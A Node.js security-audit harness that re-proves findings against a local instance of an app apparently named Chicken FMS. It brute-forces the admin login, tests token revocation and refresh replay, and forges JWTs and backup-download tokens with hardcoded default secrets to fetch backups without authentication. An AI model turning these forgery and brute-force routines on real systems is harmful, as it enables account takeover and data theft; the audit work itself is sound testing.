// V2 independent re-proof: T5-001, T5-002, T5-003, T5-005, T5-006, T5-010, T5-011 secure items
import { connect, request } from 'file:///E:/DEV/Chicken%20FMS/.qa-audit/harness/client.mjs';
import crypto from 'node:crypto';

const BASE = 'http://localhost:3117/v1';
const log = (...a) => console.log(...a);

function b64url(obj) {
  return Buffer.from(JSON.stringify(obj)).toString('base64url');
}
function signJwt(payload, secret) {
  const header = { alg: 'HS256', typ: 'JWT' };
  const h = b64url(header);
  const p = b64url(payload);
  const sig = crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url');
  return `${h}.${p}.${sig}`;
}

const admin = await connect(BASE, 'admin', 'admin123');
log('admin login OK, user=', admin.user.username, admin.user.role);

// ---- T5-006: brute force / lockout ----
let lastStatus;
for (let i = 0; i < 10; i++) {
  const r = await request(BASE, 'POST', '/auth/login', { body: { username: 'admin', password: 'wrong' + i } });
  lastStatus = r.status;
}
const after = await request(BASE, 'POST', '/auth/login', { body: { username: 'admin', password: 'admin123' } });
log('T5-006: 10x wrong password statuses last=', lastStatus, '-> correct password after:', after.status, after.ok ? 'LOGIN OK (no lockout)' : 'LOCKED');

// ---- T5-010: Swagger exposed unauthenticated ----
const sw = await request(BASE, 'GET', '/../api/docs', {}); // path adj: BASE includes /v1
const swagRaw = await fetch('http://localhost:3117/api/docs');
const swagJson = await fetch('http://localhost:3117/api/docs-json');
log('T5-010: /api/docs status=', swagRaw.status, '/api/docs-json status=', swagJson.status);

// ---- T5-005: logout/password-change do not revoke access token; refresh replay ----
const victim = await connect(BASE, 'cashier', 'cashier123').catch(() => null);
let victimUser = victim;
if (!victim) {
  // discover another login via users list
  const users = await admin.get('/users');
  log('users sample:', JSON.stringify(users.data?.slice?.(0, 5) ?? users.data));
}
// Use admin itself for the logout test to avoid guessing creds
const loginR = await request(BASE, 'POST', '/auth/login', { body: { username: 'admin', password: 'admin123' } });
const accessToken = loginR.data.accessToken;
const refreshToken = loginR.data.refreshToken;
log('fresh login for logout test: access/refresh captured');

const meBefore = await request(BASE, 'GET', '/users/me', { token: accessToken });
log('  /users/me before logout:', meBefore.status);

const logoutR = await request(BASE, 'POST', '/auth/logout', { token: accessToken, body: {} });
log('  logout response:', logoutR.status);

const meAfterLogout = await request(BASE, 'GET', '/users/me', { token: accessToken });
log('T5-005a: /users/me AFTER logout with SAME access token ->', meAfterLogout.status, meAfterLogout.status === 200 ? 'VULNERABLE (token still valid)' : 'revoked');

const refreshAfterLogout = await request(BASE, 'POST', '/auth/refresh', { body: { refreshToken } });
log('  refresh with old refresh token after logout ->', refreshAfterLogout.status);

// password change test with a fresh login
const loginR2 = await request(BASE, 'POST', '/auth/login', { body: { username: 'admin', password: 'admin123' } });
const accessToken2 = loginR2.data.accessToken;
const refreshToken2 = loginR2.data.refreshToken;
const changePwR = await admin.post('/auth/change-password', { currentPassword: 'admin123', newPassword: 'admin123' });
log('  change-password (same pw) ->', changePwR.status, JSON.stringify(changePwR.body).slice(0, 200));
const meAfterChange = await request(BASE, 'GET', '/users/me', { token: accessToken2 });
log('T5-005b: /users/me AFTER password change with SAME OLD access token ->', meAfterChange.status, meAfterChange.status === 200 ? 'VULNERABLE (token still valid)' : 'revoked');

// refresh replay test (use new login so we don't depend on above)
const loginR3 = await request(BASE, 'POST', '/auth/login', { body: { username: 'admin', password: 'admin123' } });
const rt3 = loginR3.data.refreshToken;
const refresh1 = await request(BASE, 'POST', '/auth/refresh', { body: { refreshToken: rt3 } });
const refresh2 = await request(BASE, 'POST', '/auth/refresh', { body: { refreshToken: rt3 } });
log('T5-005c: refresh token used TWICE ->', refresh1.status, refresh2.status, (refresh1.status === 200 && refresh2.status === 200) ? 'REPLAYABLE' : 'rotated/blocked');

// ---- T5-003: JWT fallback — forge token with the hardcoded default secret against THIS instance (which has JWT_SECRET set by harness) ----
const forged = signJwt({ sub: admin.user.id, type: 'access', username: 'admin' }, 'default-secret-change-me');
const forgedR = await request(BASE, 'GET', '/users/me', { token: forged });
log('T5-003a: forged token signed with default secret against instance WITH real JWT_SECRET set ->', forgedR.status, forgedR.status === 200 ? 'VULNERABLE' : 'rejected (expected, real secret in effect)');

// ---- T5-001: backup download forgeable with hardcoded fallback secret ----
// First create a backup as admin
const backupCreate = await admin.post('/system/backup', {});
log('backup create ->', backupCreate.status, JSON.stringify(backupCreate.body).slice(0, 300));
let backupId;
for (let i = 0; i < 20 && !backupId; i++) {
  await new Promise((r) => setTimeout(r, 500));
  const list = await admin.get('/system/backups');
  const items = list.data?.items ?? list.data ?? [];
  const done = items.find((x) => x.status === 'success' || x.status === 'completed' || x.status === 'done') ?? items[0];
  if (done && (done.status === 'success' || done.status === 'completed' || done.status === 'done')) backupId = done.id;
  if (i === 19) { log('backups list (final):', JSON.stringify(items).slice(0, 800)); backupId = items[0]?.id; }
}
log('using backupId=', backupId);

function signBackupToken(payload, secret) {
  // Try to mimic likely payload: {backupId, exp}; HMAC over base64url(JSON) same scheme as JWT-ish custom token
  const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const sig = crypto.createHmac('sha256', secret).update(body).digest('base64url');
  return `${body}.${sig}`;
}

if (backupId) {
  const exp = Math.floor(Date.now() / 1000) + 3600;
  const forgedBackupToken = signBackupToken({ backupId, exp }, 'fallback-secret-change-in-env');
  const dl = await fetch(`http://localhost:3117/v1/system/backups/${backupId}/download?token=${forgedBackupToken}`);
  log('T5-001a: unauth download with forged token (correct hardcoded secret, guessed payload shape) -> status=', dl.status, 'content-type=', dl.headers.get('content-type'));
  if (dl.status === 200) {
    const buf = Buffer.from(await dl.arrayBuffer());
    log('  downloaded bytes=', buf.length, 'magic=', buf.subarray(0, 4).toString('hex'));
  } else {
    log('  body=', (await dl.text()).slice(0, 300));
  }
  // control: wrong secret
  const wrongToken = signBackupToken({ backupId, exp }, 'wrong-secret');
  const dlWrong = await fetch(`http://localhost:3117/v1/system/backups/${backupId}/download?token=${wrongToken}`);
  log('T5-001b: control with WRONG secret -> status=', dlWrong.status);

  // official link for comparison of payload shape
  const officialLink = await admin.post(`/system/backups/${backupId}/download-link`, {});
  log('T5-001c: official signed download-link response:', JSON.stringify(officialLink.body).slice(0, 400));
}

console.log('DONE');
